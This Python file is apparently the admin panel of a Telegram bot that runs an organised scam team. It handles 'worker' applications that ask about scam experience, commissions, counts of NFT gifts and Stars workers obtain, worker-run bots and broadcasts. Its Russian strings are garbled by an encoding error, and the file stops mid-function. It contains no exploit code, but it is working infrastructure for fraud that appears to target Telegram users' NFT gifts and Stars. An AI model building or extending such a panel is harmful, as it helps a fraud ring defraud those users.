import asyncio
import os
import shutil
import tempfile
from asyncio import create_task

from aiogram import F, Router, types
from aiogram.exceptions import TelegramBadRequest
from sqlalchemy import not_
from sqlalchemy.orm import selectinload
from aiogram.filters.command import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import CallbackQuery, FSInputFile, InlineKeyboardButton, InlineKeyboardMarkup
from sqlalchemy import func, select

from config import PANEL_OWNERS
from db import Session
from models import Admin, Application, GlobalStats, NFTGift, WorkerBot

admin_router = Router()

class ChangeCommissionState(StatesGroup):
    waiting_for_worker_id = State()
    waiting_for_new_commission = State()
    waiting_for_global_commission = State()

class BroadcastState(StatesGroup):
    waiting_for_text = State()
    waiting_for_photo_decision = State()
    waiting_for_photo = State()

class TransferWorkerStatsState(StatesGroup):
    waiting_for_from_user = State()
    waiting_for_to_user = State()

class SendMsgToWorkerState(StatesGroup):
    waiting_for_worker_id = State()
    waiting_for_message = State()

class SearchWorkerState(StatesGroup):
    waiting_for_worker_ident = State()

class ChangeWorkerStatusState(StatesGroup):
    waiting_for_worker_ident = State()
    waiting_for_new_status = State()

class AddNFTLinksState(StatesGroup):
    waiting_for_links = State()

TOP_REFERRALS_PER_PAGE = 10

# üîÅ –û–±—â–∞—è —Ñ—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –∑–∞—è–≤–∫–∏
async def send_application_message(bot, admin_id: int, app: Application):
    text = (
        f"<b>üì• –ó–∞—è–≤–∫–∞ #{app.id}</b>\n\n"
        f"<b>üë§ ID:</b> <code>{app.telegram_id}</code>\n"
        f"<b>üë§ –¢–µ–≥:</b> @{app.username or '–Ω–µ—Ç'}\n"
        f"<b>üë§ –ò–º—è:</b> {app.first_name or '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}\n"
        f"<b>1Ô∏è‚É£ –û—Ç–∫—É–¥–∞ —É–∑–Ω–∞–ª:</b> {app.project_source}\n"
        f"<b>2Ô∏è‚É£ –û–ø—ã—Ç:</b> {app.scam_experience}\n"
        f"<b>3Ô∏è‚É£ –í—Ä–µ–º—è –Ω–∞ –ø—Ä–æ–µ–∫—Ç:</b> {app.work_time}\n"
        f"<b>4Ô∏è‚É£ –¶–µ–ª–∏:</b> {app.goals}"
    )
    markup = InlineKeyboardMarkup(inline_keyboard=[[ 
        InlineKeyboardButton(text="‚úÖ –ü—Ä–∏–Ω—è—Ç—å", callback_data=f"accept_app:{app.id}"),
        InlineKeyboardButton(text="‚ùå –û—Ç–∫–ª–æ–Ω–∏—Ç—å", callback_data=f"reject_app:{app.id}")
    ]])
    try:
        await bot.send_message(admin_id, text, reply_markup=markup, parse_mode="HTML")
    except Exception as e:
        print(f"[ERROR] –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –∑–∞—è–≤–∫—É –∞–¥–º–∏–Ω—É {admin_id}: {e}")

@admin_router.message(Command("admin"), F.chat.type == "private")
async def handle_admin_command(message: types.Message):
    if message.from_user.id not in PANEL_OWNERS:
        await message.answer("–í—Ö–æ–¥ 10000 TON")
        return

    async with Session() as session:
        total_admins = (await session.execute(
            select(func.count()).select_from(Admin)
        )).scalar()

        pending = (await session.execute(
            select(func.count()).select_from(Application).where(Application.status == "pending"))
        ).scalar()
        total_bots = (await session.execute(
            select(func.count()).select_from(WorkerBot))
        ).scalar()
        accepted = (await session.execute(
            select(func.count()).select_from(Application).where(Application.status == "accepted"))
        ).scalar()

    markup = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="–ó–∞—è–≤–∫–∏", callback_data="show_pending_apps"),
            InlineKeyboardButton(text="–í–æ—Ä–∫–µ—Ä—ã", callback_data="show_workers"),
        ],
        [
            InlineKeyboardButton(text="–ë–æ—Ç—ã", callback_data="show_worker_bots"),
            InlineKeyboardButton(text="–†–∞—Å—Å—ã–ª–∫–∞", callback_data="broadcast_to_workers"),
        ],
        [
            InlineKeyboardButton(text="–ö–æ–º–∏—Å—Å–∏—è –≤–æ—Ä–∫–µ—Ä–∞", callback_data="change_worker_commission"),
            InlineKeyboardButton(text="–ö–æ–º–∏—Å—Å–∏—è –æ–±—â–∞—è", callback_data="change_global_commission"),
        ],
        [
            InlineKeyboardButton(text="–ü–µ—Ä–µ–Ω–µ—Å—Ç–∏ —Å—Ç–∞—Ç—É", callback_data="transfer_worker_stats"),
            InlineKeyboardButton(text="–°—Ç–∞—Ç—É—Å –≤–æ—Ä–∫–µ—Ä–∞", callback_data="change_worker_status"),
        ],
        [
            InlineKeyboardButton(text="–ü–æ–∏—Å–∫ –≤–æ—Ä–∫–µ—Ä–∞", callback_data="search_worker"),
            InlineKeyboardButton(text="–¢–æ–ø —Ä–µ—Ñ–µ—Ä–∞–ª—ã", callback_data="show_top_referrals"),
        ],
        [
            InlineKeyboardButton(text="NFT —Å—Å—ã–ª–∫–∏", callback_data="add_nft_links"),
            InlineKeyboardButton(text="–°–±—Ä–æ—Å —Å—Ç–∞—Ç—ã", callback_data="reset_daily_stats"),
        ],
        [
            InlineKeyboardButton(text="–°–æ–æ–±—â–µ–Ω–∏–µ –≤–æ—Ä–∫–µ—Ä—É", callback_data="send_message_to_worker"),
        ]
    ])

    await message.answer(
        f"<b>üõ† –ü–∞–Ω–µ–ª—å</b>\n"
        f"<b>üë• –í—Å–µ–≥–æ –≤–æ—Ä–∫–µ—Ä–æ–≤:</b> <b>{total_admins}</b>\n"
        f"<b>ü§ñ –í—Å–µ–≥–æ –±–æ—Ç–æ–≤:</b> <b>{total_bots}</b>\n"
        f"<b>‚úÖ –ü—Ä–∏–Ω—è—Ç–æ –∑–∞—è–≤–æ–∫:</b> <b>{accepted}</b>\n"
        f"<b>‚åõÔ∏è –í –æ–∂–∏–¥–∞–Ω–∏–∏:</b> <b>{pending}</b>",
        parse_mode="HTML",
        reply_markup=markup
    )

@admin_router.callback_query(F.data == "show_pending_apps")
async def show_pending_apps(callback: CallbackQuery):
    async with Session() as session:
        result = await session.execute(select(Application).where(Application.status == "pending"))
        apps = result.scalars().all()

    if not apps:
        await callback.answer("‚è≥ –ù–µ—Ç –∑–∞—è–≤–æ–∫ –≤ –æ–∂–∏–¥–∞–Ω–∏–∏", show_alert=True)
        return

    for app in apps:
        await send_application_message(callback.bot, callback.from_user.id, app)

    await callback.answer("üì® –ó–∞—è–≤–∫–∏ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã")

@admin_router.callback_query(F.data.startswith("accept_app:"))
async def accept_application(callback: CallbackQuery):
    app_id = int(callback.data.split(":")[1])
    delivered = True

    async with Session() as session:
        app = await session.get(Application, app_id)
        if not app:
            await callback.answer("‚ùå –ó–∞—è–≤–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞", show_alert=True)
            return
        if app.status != "pending":
            await callback.answer("‚è≥ –ó–∞—è–≤–∫–∞ —É–∂–µ –æ–±—Ä–∞–±–æ—Ç–∞–Ω–∞ –¥—Ä—É–≥–∏–º –∞–¥–º–∏–Ω–æ–º", show_alert=True)
            await callback.message.edit_reply_markup(reply_markup=InlineKeyboardMarkup(
                inline_keyboard=[[
                    InlineKeyboardButton(
                        text="‚úÖ –û–¥–æ–±—Ä–µ–Ω–æ" if app.status == "accepted" else "‚ùå –û—Ç–∫–∞–∑",
                        callback_data="ignore"
                    )
                ]]
            ))
            return

        app.status = "accepted"
        admin = (await session.execute(select(Admin).where(Admin.telegram_id == app.telegram_id))).scalar_one_or_none()
        if admin:
            admin.is_accepted = True
        await session.commit()

    await callback.answer("‚úÖ –ü—Ä–∏–Ω—è—Ç–æ")
    await callback.message.edit_reply_markup(reply_markup=InlineKeyboardMarkup(
        inline_keyboard=[[
            InlineKeyboardButton(text="‚úÖ –û–¥–æ–±—Ä–µ–Ω–æ", callback_data="ignore")
        ]]
    ))

    markup = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="üí¨ –í—Å—Ç—É–ø–∏—Ç—å –≤ —á–∞—Ç–∏–∫", url="https://t.me/+PJVvLxYCft8xYTky")
    ]])
    async def send_accept_message():
        nonlocal delivered
        try:
            await callback.bot.send_message(
                app.telegram_id,
                "<b>‚úÖ –ó–∞—è–≤–∫–∞ –æ–¥–æ–±—Ä–µ–Ω–∞!\n\n–¢–µ–ø–µ—Ä—å –ø—Ä–æ–ø–∏—à–∏—Ç–µ –∫–æ–º–∞–Ω–¥—É /start –¥–ª—è –Ω–∞—á–∞–ª–∞ —Ä–∞–±–æ—Ç—ã.</b>",
                parse_mode="HTML",
                reply_markup=markup
            )
        except TelegramBadRequest as e:
            print(f"[ERROR] –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–ª –±–æ—Ç–∞: {e}")
            delivered = False
        except Exception as e:
            print(f"[ERROR] –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏: {e}")
            delivered = False

    asyncio.create_task(send_accept_message())

@admin_router.callback_query(F.data.startswith("reject_app:"))
async def reject_application(callback: CallbackQuery):
    app_id = int(callback.data.split(":")[1])

    async with Session() as session:
        app = await session.get(Application, app_id)
        if not app:
            await callback.answer("‚ùå –ó–∞—è–≤–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞", show_alert=True)
            return
        if app.status != "pending":
            await callback.answer("‚è≥ –ó–∞—è–≤–∫–∞ —É–∂–µ –æ–±—Ä–∞–±–æ—Ç–∞–Ω–∞ –¥—Ä—É–≥–∏–º –∞–¥–º–∏–Ω–æ–º", show_alert=True)
            await callback.message.edit_reply_markup(reply_markup=InlineKeyboardMarkup(
                inline_keyboard=[[
                    InlineKeyboardButton(
                        text="‚úÖ –û–¥–æ–±—Ä–µ–Ω–æ" if app.status == "accepted" else "‚ùå –û—Ç–∫–∞–∑",
                        callback_data="ignore"
                    )
                ]]
            ))
            return

        app.status = "rejected"
        await session.commit()

    await callback.answer("‚ùå –û—Ç–∫–ª–æ–Ω–µ–Ω–æ")
    await callback.message.edit_reply_markup(reply_markup=InlineKeyboardMarkup(
        inline_keyboard=[[InlineKeyboardButton(text="‚ùå –û—Ç–∫–∞–∑", callback_data="ignore")]]
    ))

    markup = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(
            text="–ù–∞–ø–∏—Å–∞—Ç—å –∞–¥–º–∏–Ω—É",
            url="https://t.me/Persilf"
        )
    ]])
    async def send_reject_message():
        try:
            await callback.bot.send_message(
                app.telegram_id,
                "<b>‚ùå –í–∞—à–∞ –∑–∞—è–≤–∫–∞ –±—ã–ª–∞ –æ—Ç–∫–ª–æ–Ω–µ–Ω–∞.</b>\n\n"
                "<b>–°–≤—è–∂–∏—Ç–µ—Å—å —Å –∞–¥–º–∏–Ω–æ–º –¥–ª—è –¥–∞–ª—å–Ω–µ–π—à–µ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏</b>",
                parse_mode="HTML",
                reply_markup=markup
            )
        except Exception as e:
            print(f"[ERROR] –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é: {e}")

    asyncio.create_task(send_reject_message())

@admin_router.callback_query(F.data == "change_worker_commission")
async def ask_worker_id(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer(
        "<b>üßë‚Äçüíº –í–≤–µ–¥–∏—Ç–µ Telegram ID –≤–æ—Ä–∫–µ—Ä–∞, –∫–æ—Ç–æ—Ä–æ–º—É –Ω—É–∂–Ω–æ –∏–∑–º–µ–Ω–∏—Ç—å –∫–æ–º–∏—Å—Å–∏—é:</b>",
        parse_mode="HTML"
    )
    await state.set_state(ChangeCommissionState.waiting_for_worker_id)
    await callback.answer()

@admin_router.message(ChangeCommissionState.waiting_for_worker_id)
async def receive_worker_id(message: types.Message, state: FSMContext):
    try:
        worker_id = int(message.text.strip())
    except ValueError:
        await message.answer("<b>‚ùå –í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π —á–∏—Å–ª–æ–≤–æ–π Telegram ID.</b>", parse_mode="HTML")
        return

    async with Session() as session:
        stmt = select(Admin).where(Admin.telegram_id == worker_id)
        result = await session.execute(stmt)
        admin = result.scalar_one_or_none()

        if not admin:
            await message.answer("<b>‚ùå –í–æ—Ä–∫–µ—Ä —Å —Ç–∞–∫–∏–º Telegram ID –Ω–µ –Ω–∞–π–¥–µ–Ω.</b>", parse_mode="HTML")
            return

    await state.update_data(worker_id=worker_id)
    await message.answer(
        f"<b>üî¢ –¢–µ–∫—É—â–∞—è –∫–æ–º–∏—Å—Å–∏—è –≤–æ—Ä–∫–µ—Ä–∞ <code>{worker_id}</code>: {admin.commission_every}\n\n"
        f"‚úèÔ∏è –í–≤–µ–¥–∏—Ç–µ –Ω–æ–≤–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –∫–æ–º–∏—Å—Å–∏–∏ (—Ü–µ–ª–æ–µ —á–∏—Å–ª–æ, –Ω–∞–ø—Ä–∏–º–µ—Ä 4):</b>",
        parse_mode="HTML"
    )
    await state.set_state(ChangeCommissionState.waiting_for_new_commission)

@admin_router.message(ChangeCommissionState.waiting_for_new_commission)
async def receive_new_commission(message: types.Message, state: FSMContext):
    try:
        new_value = int(message.text.strip())
        if new_value <= 0:
            raise ValueError
    except ValueError:
        await message.answer("<b>‚ùå –í–≤–µ–¥–∏—Ç–µ –ø–æ–ª–æ–∂–∏—Ç–µ–ª—å–Ω–æ–µ —Ü–µ–ª–æ–µ —á–∏—Å–ª–æ.</b>", parse_mode="HTML")
        return

    data = await state.get_data()
    worker_id = data.get("worker_id")

    async with Session() as session:
        stmt = select(Admin).where(Admin.telegram_id == worker_id)
        result = await session.execute(stmt)
        admin = result.scalar_one_or_none()

        if not admin:
            await message.answer("<b>‚ùå –í–æ—Ä–∫–µ—Ä –Ω–µ –Ω–∞–π–¥–µ–Ω.</b>", parse_mode="HTML")
            await state.clear()
            return

        admin.commission_every = new_value
        admin.commission_counter = 0  
        await session.commit()

    await message.answer(
        f"<b>‚úÖ –ö–æ–º–∏—Å—Å–∏—è –¥–ª—è –≤–æ—Ä–∫–µ—Ä–∞ <code>{worker_id}</code> –æ–±–Ω–æ–≤–ª–µ–Ω–∞ –Ω–∞ {new_value}, —Å—á—ë—Ç—á–∏–∫ —Å–±—Ä–æ—à–µ–Ω.</b>",
        parse_mode="HTML"
    )
    await state.clear()

@admin_router.callback_query(F.data == "change_global_commission")
async def ask_global_commission(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer(
        "<b>üõ† –í–≤–µ–¥–∏—Ç–µ –Ω–æ–≤–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –æ–±—â–µ–π –∫–æ–º–∏—Å—Å–∏–∏ –¥–ª—è –≤—Å–µ—Ö –≤–æ—Ä–∫–µ—Ä–æ–≤:</b>",
        parse_mode="HTML"
    )
    await state.set_state(ChangeCommissionState.waiting_for_global_commission)
    await callback.answer()

@admin_router.message(ChangeCommissionState.waiting_for_global_commission)
async def receive_global_commission(message: types.Message, state: FSMContext):
    try:
        new_value = int(message.text.strip())
        if new_value <= 0:
            raise ValueError
    except ValueError:
        await message.answer("<b>‚ùå –í–≤–µ–¥–∏—Ç–µ –ø–æ–ª–æ–∂–∏—Ç–µ–ª—å–Ω–æ–µ —Ü–µ–ª–æ–µ —á–∏—Å–ª–æ.</b>", parse_mode="HTML")
        return

    async with Session() as session:
        result = await session.execute(select(Admin))
        all_admins = result.scalars().all()

        for admin in all_admins:
            admin.commission_every = new_value
            admin.commission_counter = 0  

        await session.commit()

    await message.answer(
        f"<b>‚úÖ –û–±—â–∞—è –∫–æ–º–∏—Å—Å–∏—è –æ–±–Ω–æ–≤–ª–µ–Ω–∞ –Ω–∞ {new_value} –∏ —Å—á—ë—Ç—á–∏–∫–∏ —Å–±—Ä–æ—à–µ–Ω—ã —É –≤—Å–µ—Ö –≤–æ—Ä–∫–µ—Ä–æ–≤.</b>",
        parse_mode="HTML"
    )
    await state.clear()

    
@admin_router.callback_query(F.data == "reset_daily_stats")
async def reset_daily_statistics(callback: CallbackQuery):
    async with Session() as session:
        result = await session.execute(select(Admin))
        admins = result.scalars().all()

        for admin in admins:
            admin.daily_gifts_unique = 0
            admin.daily_stars_sent = 0

        global_stats = await session.get(GlobalStats, 1)
        if global_stats:
            global_stats.daily_gifts_unique = 0
            global_stats.daily_stars_sent = 0

        await session.commit()

    await callback.answer("‚úÖ –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –∑–∞ –¥–µ–Ω—å —Å–±—Ä–æ—à–µ–Ω–∞", show_alert=True)

@admin_router.callback_query(F.data == "broadcast_to_workers")
async def broadcast_to_workers(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer("<b>‚úâÔ∏è –í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç —Ä–∞—Å—Å—ã–ª–∫–∏:</b>", parse_mode="HTML")
    await state.set_state(BroadcastState.waiting_for_text)
    await callback.answer()

@admin_router.message(BroadcastState.waiting_for_text)
async def process_broadcast_text(message: types.Message, state: FSMContext):
    await state.update_data(text=message.html_text)

    markup = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="–î–∞", callback_data="add_photo"),
            InlineKeyboardButton(text="–ù–µ—Ç", callback_data="no_photo")
        ]
    ])

    await message.answer(
        "<b>–î–æ–±–∞–≤–∏—Ç—å —Ñ–æ—Ç–æ –∫ —Ä–∞—Å—Å—ã–ª–∫–µ?</b>",
        reply_markup=markup,
        parse_mode="HTML"
    )
    await state.set_state(BroadcastState.waiting_for_photo_decision)

@admin_router.callback_query(F.data == "add_photo")
async def ask_for_photo(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer("<b>üì§ –ü—Ä–∏—à–ª–∏ —Ñ–æ—Ç–æ –¥–ª—è —Ä–∞—Å—Å—ã–ª–∫–∏:</b>", parse_mode="HTML")
    await state.set_state(BroadcastState.waiting_for_photo)
    await callback.answer()

@admin_router.callback_query(F.data == "no_photo")
async def no_photo_broadcast(callback: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    text = data.get("text")
    await state.clear()

    await callback.message.answer("<b>üöÄ –†–∞—Å—Å—ã–ª–∫–∞ –∑–∞–ø—É—â–µ–Ω–∞...</b>", parse_mode="HTML")
    create_task(run_broadcast(callback.bot, text, None, callback.from_user.id))
    await callback.answer()

@admin_router.message(BroadcastState.waiting_for_photo, F.photo)
async def handle_photo(message: types.Message, state: FSMContext):
    data = await state.get_data()
    text = data.get("text")
    photo_id = message.photo[-1].file_id  
    await state.clear()

    await message.answer("<b>üöÄ –†–∞—Å—Å—ã–ª–∫–∞ —Å —Ñ–æ—Ç–æ –∑–∞–ø—É—â–µ–Ω–∞...</b>", parse_mode="HTML")
    create_task(run_broadcast(message.bot, text, photo_id, message.chat.id))

@admin_router.message(BroadcastState.waiting_for_text)
async def process_broadcast_text(message: types.Message, state: FSMContext):
    text = message.html_text
    await state.clear()
    await message.answer("<b>üöÄ –†–∞—Å—Å—ã–ª–∫–∞ –∑–∞–ø—É—â–µ–Ω–∞...</b>", parse_mode="HTML")

    create_task(run_broadcast(message.bot, text, message.chat.id))

async def run_broadcast(bot, text: str, photo_id: str | None, admin_chat_id: int):
    success, failed, total = 0, 0, 0

    async with Session() as session:
        result = await session.execute(
            select(Admin).where(Admin.telegram_id.not_in(PANEL_OWNERS))
        )
        admins = result.scalars().all()

    for admin in admins:
        total += 1
        try:
            if photo_id:
                await bot.send_photo(chat_id=admin.telegram_id, photo=photo_id, caption=text, parse_mode="HTML")
            else:
                await bot.send_message(chat_id=admin.telegram_id, text=text, parse_mode="HTML")
            success += 1
        except Exception as e:
            print(f"[ERROR] {admin.telegram_id} ‚Äî {e}")
            failed += 1
        await asyncio.sleep(0.07)

    try:
        await bot.send_message(
            chat_id=admin_chat_id,
            text=(
                f"<b>üìä –†–µ–∑—É–ª—å—Ç–∞—Ç—ã —Ä–∞—Å—Å—ã–ª–∫–∏:</b>\n\n"
                f"<b>üíÅüèª‚Äç‚ôÄÔ∏è –í—Å–µ–≥–æ:</b> <code>{total}</code>\n"
                f"<b>‚úÖ –£—Å–ø–µ—à–Ω–æ:</b> <code>{success}</code>\n"
                f"<b>‚ùå –û—à–∏–±–æ–∫:</b> <code>{failed}</code>"
            ),
            parse_mode="HTML"
        )
    except Exception as e:
        print(f"[ERROR] –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –æ—Ç—á—ë—Ç: {e}")

@admin_router.callback_query(F.data.startswith("show_workers"))
async def show_workers(callback: CallbackQuery):
    page = int(callback.data.split(":")[1]) if ":" in callback.data else 1
    per_page = 10

    async with Session() as session:
        result = await session.execute(select(Admin))  
        admins = result.scalars().all()

    admins.sort(key=lambda a: (a.commission_every - a.commission_counter))
    total = len(admins)
    total_pages = (total + per_page - 1) // per_page
    page = max(1, min(page, total_pages))
    start = (page - 1) * per_page
    end = start + per_page
    admins_page = admins[start:end]

    rows = []
    for i, a in enumerate(admins_page, start=start + 1):
        left_to_commission = a.commission_every - a.commission_counter
        rows.append(
            f"–í–æ—Ä–∫–µ—Ä #{i}\n"
            f"üÜî {a.telegram_id}\n"
            f"üîπ –¢—ç–≥: @{a.username or '–Ω–µ—Ç'}\n"
            f"üìõ –ò–º—è: {a.first_name or '-'} {a.last_name or ''}\n"
            f"üí¨ –ù–∏–∫–Ω–µ–π–º: {a.nickname or '-'}\n"
            f"üí∏ –ö–æ–º–∏—Å—Å–∏—è: {a.commission_every} | –°—á—ë—Ç—á–∏–∫: {a.commission_counter}\n"
            f"üéÅ NFT: {a.gifts_unique_sent}\n"
            f"üåü –ó–≤—ë–∑–¥: {a.stars_sent}\n"
            f"üìä –°–µ–≥–æ–¥–Ω—è ‚Äî üéÅ {a.daily_gifts_unique}, üåü {a.daily_stars_sent}\n"
        )

    text = "\n".join(rows) if rows else "–í–æ—Ä–∫–µ—Ä—ã –Ω–µ –Ω–∞–π–¥–µ–Ω—ã."

    nav = []
    nav.append(InlineKeyboardButton(text="‚¨ÖÔ∏è", callback_data=f"show_workers:{page-1}" if page > 1 else "ignore"))
    nav.append(InlineKeyboardButton(text=f"{page}/{total_pages}", callback_data="ignore"))
    nav.append(InlineKeyboardButton(text="‚û°Ô∏è", callback_data=f"show_workers:{page+1}" if page < total_pages else "ignore"))

    markup = InlineKeyboardMarkup(inline_keyboard=[nav])

    await callback.message.edit_text(text, reply_markup=markup)
    await callback.answer()

@admin_router.callback_query(F.data.startswith("show_worker_bots"))
async def show_worker_bots(callback: CallbackQuery):
    page = int(callback.data.split(":")[1]) if ":" in callback.data else 1
    per_page = 7

    async with Session() as session:
        result = await session.execute(
            select(WorkerBot)
            .options(selectinload(WorkerBot.owner))
            .order_by(WorkerBot.owner_id, WorkerBot.id)
        )
        bots = result.scalars().all()

    # –ì—Ä—É–ø–ø–∏—Ä—É–µ–º –ø–æ owner_id
    grouped = {}
    for bot in bots:
        grouped.setdefault(bot.owner_id, []).append(bot)

    grouped_items = list(grouped.items())
    total = len(grouped_items)
    total_pages = (total + per_page - 1) // per_page
    page = max(1, min(page, total_pages))
    start = (page - 1) * per_page
    end = start + per_page
    current_page_items = grouped_items[start:end]

    rows = []
    for i, (owner_id, bots) in enumerate(current_page_items, start=start + 1):
        owner = bots[0].owner
        header = (
            f"<b>üë§ –í–ª–∞–¥–µ–ª–µ—Ü #{i}</b>\n"
            f"üÜî ID: {owner.telegram_id if owner else '-'}\n"
            f"üë§ –¢—ç–≥: @{owner.username if owner and owner.username else '–Ω–µ—Ç'}\n"
            f"ü§ñ –ë–æ—Ç—ã:\n"
        )
        bots_list = "\n".join([f"    ‚Ä¢ @{bot.username}" for bot in bots])
        rows.append(f"{header}{bots_list}\n")

    text = "\n".join(rows) if rows else "–ù–µ—Ç –≤–æ—Ä–∫–µ—Ä-–±–æ—Ç–æ–≤."

    nav = [
        InlineKeyboardButton(text="‚¨ÖÔ∏è", callback_data=f"show_worker_bots:{page-1}" if page > 1 else "ignore"),
        InlineKeyboardButton(text=f"{page}/{total_pages}", callback_data="ignore"),
        InlineKeyboardButton(text="‚û°Ô∏è", callback_data=f"show_worker_bots:{page+1}" if page < total_pages else "ignore")
    ]

    markup = InlineKeyboardMarkup(inline_keyboard=[nav])

    await callback.message.edit_text(text, reply_markup=markup, parse_mode="HTML")
    await callback.answer()

@admin_router.callback_query(F.data == "transfer_worker_stats")
async def ask_from_user(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer(
        "<b>–£–∫–∞–∂–∏ Telegram ID –∏–ª–∏ —é–∑–µ—Ä–Ω–µ–π–º –≤–æ—Ä–∫–µ—Ä–∞, <u>–æ—Ç–∫—É–¥–∞</u> –ø–µ—Ä–µ–Ω–æ—Å–∏–º —Å—Ç–∞—Ç—É:</b>",
        parse_mode="HTML"
    )
    await state.set_state(TransferWorkerStatsState.waiting_for_from_user)
    await callback.answer()

@admin_router.message(TransferWorkerStatsState.waiting_for_from_user)
async def receive_from_user(message: types.Message, state: FSMContext):
    ident = message.text.strip().lstrip('@')
    async with Session() as session:
        query = select(Admin)
        if ident.isdigit():
            query = query.where(Admin.telegram_id == int(ident))
        else:
            query = query.where(Admin.username.ilike(ident))
        admin_from = (await session.execute(query)).scalar_one_or_none()

    if not admin_from:
        await message.answer("<b>‚ùå –í–æ—Ä–∫–µ—Ä –Ω–µ –Ω–∞–π–¥–µ–Ω. –í–≤–µ–¥–∏ –ø—Ä–∞–≤–∏–ª—å–Ω—ã–π Telegram ID –∏–ª–∏ username.</b>", parse_mode="HTML")
        return

    await state.update_data(from_user_id=admin_from.telegram_id)
    await message.answer(
        "<b>–í–≤–µ–¥–∏ Telegram ID –∏–ª–∏ —é–∑–µ—Ä–Ω–µ–π–º –≤–æ—Ä–∫–µ—Ä–∞, <u>–ö–£–î–ê</u> –ø–µ—Ä–µ–Ω–µ—Å—Ç–∏ —Å—Ç–∞—Ç—É:</b>",
        parse_mode="HTML"
    )
    await state.set_state(TransferWorkerStatsState.waiting_for_to_user)

@admin_router.message(TransferWorkerStatsState.waiting_for_to_user)
async def receive_to_user(message: types.Message, state: FSMContext):
    ident = message.text.strip().lstrip('@')
    data = await state.get_data()
    from_user_id = data.get("from_user_id")

    async with Session() as session:
        admin_from = (await session.execute(select(Admin).where(Admin.telegram_id == from_user_id))).scalar_one_or_none()
        query = select(Admin)
        if ident.isdigit():
            query = query.where(Admin.telegram_id == int(ident))
        else:
            query = query.where(Admin.username.ilike(ident))
        admin_to = (await session.execute(query)).scalar_one_or_none()

        if not admin_to:
            await message.answer("<b>‚ùå –ö—É–¥–∞ –ø–µ—Ä–µ–Ω–æ—Å–∏—Ç—å ‚Äî –≤–æ—Ä–∫–µ—Ä –Ω–µ –Ω–∞–π–¥–µ–Ω.</b>", parse_mode="HTML")
            return
        if admin_to.telegram_id == admin_from.telegram_id:
            await message.answer("<b>‚ùóÔ∏è –ü–µ—Ä–µ–Ω–æ—Å–∏—Ç—å —Å–∞–º–æ–º—É —Å–µ–±–µ –Ω–µ–ª—å–∑—è.</b>", parse_mode="HTML")
            return

        gifts = admin_from.gifts_unique_sent
        stars = admin_from.stars_sent
        admin_to.gifts_unique_sent += gifts
        admin_to.stars_sent += stars
        await session.commit()

    await message.answer(
        f"<b>‚úÖ –°—Ç–∞—Ç–∞ –≤–æ—Ä–∫–µ—Ä–∞ —É—Å–ø–µ—à–Ω–æ –ø–µ—Ä–µ–Ω–µ—Å–µ–Ω–∞.</b>\n"
        f"<b>–°:</b> <code>{admin_from.telegram_id}</code> ‚Üí <b>–ù–∞:</b> <code>{admin_to.telegram_id}</code>\n"
        f"<b>üéÅ NFT:</b> <code>{gifts}</code>\n"
        f"<b>üåü –ó–≤—ë–∑–¥:</b> <code>{stars}</code>",
        parse_mode="HTML"
    )
    await state.clear()

@admin_router.callback_query(F.data == "send_message_to_worker")
async def ask_worker_id(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer(
        "<b>–í–≤–µ–¥–∏ Telegram ID –∏–ª–∏ username –≤–æ—Ä–∫–µ—Ä–∞:</b>",
        parse_mode="HTML"
    )
    await state.set_state(SendMsgToWorkerState.waiting_for_worker_id)
    await callback.answer()

@admin_router.message(SendMsgToWorkerState.waiting_for_worker_id)
async def receive_worker_id(message: types.Message, state: FSMContext):
    ident = message.text.strip().lstrip('@')

    async with Session() as session:
        query = select(Admin)
        if ident.isdigit():
            query = query.where(Admin.telegram_id == int(ident))
        else:
            query = query.where(Admin.username.ilike(ident))
        worker = (await session.execute(query)).scalar_one_or_none()

    if not worker:
        await message.answer("<b>‚ùå –í–æ—Ä–∫–µ—Ä –Ω–µ –Ω–∞–π–¥–µ–Ω.</b>", parse_mode="HTML")
        return

    await state.update_data(worker_id=worker.telegram_id)
    await message.answer("<b>–í–≤–µ–¥–∏ —Ç–µ–∫—Å—Ç –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤–æ—Ä–∫–µ—Ä—É:</b>", parse_mode="HTML")
    await state.set_state(SendMsgToWorkerState.waiting_for_message)

@admin_router.message(SendMsgToWorkerState.waiting_for_message)
async def send_message_to_worker(message: types.Message, state: FSMContext):
    data = await state.get_data()
    worker_id = data.get("worker_id")

    if not (message.text or message.html_text):
